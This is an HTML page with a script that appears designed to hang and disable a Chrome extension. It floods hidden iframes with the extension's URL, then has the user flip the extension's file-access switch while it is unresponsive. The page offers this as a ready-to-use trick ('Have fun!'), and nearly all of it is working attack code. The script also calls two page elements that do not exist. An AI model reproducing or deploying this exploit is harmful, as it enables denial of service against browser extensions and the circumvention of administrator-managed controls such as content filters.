<!DOCTYPE html>
<html>
    <head><title>Go to the url.</title></head>
    <body>
        <p>Quick! In a new tab, go to chrome://extensions and click the extension to hang. The url should be extUrl there! You have 15 seconds. Follow the instructions in the title. When it says "flip switch", click the "allow access to file urls" switch until it gets toggled, and then click it again until it gets toggled. When it says "hanging", it might be laggy. Have fun!</p>
        <script>
            var [name, url] = JSON.parse(atob(location.hash.slice(1)));
function replaceIframes(container, iframeSrc) {
  const totalIframes = 1000;
  const timeLimitMs = 5000; // 5 seconds
  const batchSize = 50; // Number of iframes created per batch
  const intervalTime = timeLimitMs / (totalIframes / batchSize); // Adjusted interval for spreading the frames

  let createdIframes = 0;

  const interval = setInterval(() => {
    if (createdIframes >= totalIframes) {
      clearInterval(interval);
      document.getElementById('overlay').style.display = 'none'; // Hide overlay
      document.getElementById('killButton').style.display = 'block'; // Show kill button
      return;
    }

    for (let i = 0; i < batchSize && createdIframes < totalIframes; i++) {
      const iframe = document.createElement('iframe');
      iframe.src = iframeSrc;
      iframe.style.width = '100%';
      iframe.style.height = '100px';
      container.appendChild(iframe);
      createdIframes++;
    }
  }, intervalTime);
}

  document.querySelector("p").innerText = document.querySelector("p").innerText.replace("extUrl", "chrome://extensions/?id=" + url.split('//')[1].split('/')[0])
setTimeout(function(){
    document.title = "hanging " + name + "...";
    const iframeContainer = document.createElement('div');
    iframeContainer.style.display = "none";
    document.body.appendChild(iframeContainer);
    replaceIframes(iframeContainer, url);
    setTimeout(function(){
        document.title = "flip switch";
        location.href = url;
    }, 5000);
}, 15000);
        </script>
    </body>
</html>
